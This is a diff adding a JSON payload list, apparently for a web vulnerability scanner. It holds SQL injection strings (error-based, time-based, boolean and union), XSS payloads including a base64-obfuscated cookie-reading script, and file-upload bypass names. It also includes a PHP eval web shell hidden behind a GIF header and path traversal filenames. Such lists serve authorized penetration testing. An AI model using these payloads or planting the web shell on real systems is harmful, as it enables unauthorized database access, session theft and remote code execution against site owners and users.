@@ -1,0 +1,68 @@
+{
+    "sql_injection": {
+        "error_based": [
+            "'",
+            "\"",
+            "' OR '1'='1",
+            "\" OR \"1\"=\"1",
+            "admin'",
+            "' OR 'a'='a",
+            "\" OR \"a\"=\"a",
+            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+            "' AND 1=2 "
+        ],
+        "time_blind": [
+            "' OR SLEEP(5)",
+            "'; SLEEP(5)",
+            "' OR benchmark(1000000,md5(1))",
+            "%df' OR SLEEP(5)",
+            "1 AND SLEEP(5)"
+        ],
+        "boolean_blind": [
+            " AND 1=1", 
+            " AND 1=2",
+            "' AND '1'='1", 
+            "' AND '1'='2",
+            " OR 1=1", 
+            " OR 1=2"
+        ],
+        "union_based":[
+                " ORDER BY {}",
+                "' ORDER BY {}",
+                "\" ORDER BY {}"
+            ]
+    },
+    "xss": {
+        "stored": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert('1')>",
+            "&#x3C;script&#x3E;alert(document.cookie)&#x3C;/script&#x3E;",
+            "<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))></svg>"
+        ],
+        "reflected": [
+            "<script>alert('1')</script>",
+            "<img src=1 onerror=alert(1)>",
+            "\" onerror=alert(1) src=1 ",
+            "'><img src=x onerror=alert(1)>",
+            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+            "<ScRiPt>alert(1)</ScRiPt>",
+            "<input autofocus onfocus=alert(1) type=text>"
+        ]
+    },
+    "file_upload": [
+        "shell.php.jpg",
+        "shell.php;.jpg",
+        "shell.php%00.jpg",
+        "shell.php%20.jpg",
+        "shell.pHp",
+        "shell.php5",
+        "shell.phtml",
+        "GIF89a<?php @eval($_POST['cmd']); ?>",
+        "../shell.php",
+        "../../../shell.php",
+        "shell.php_",
+        "shell.\\php",
+        "shell::$DATA",
+        "shell. "
+    ]
+}
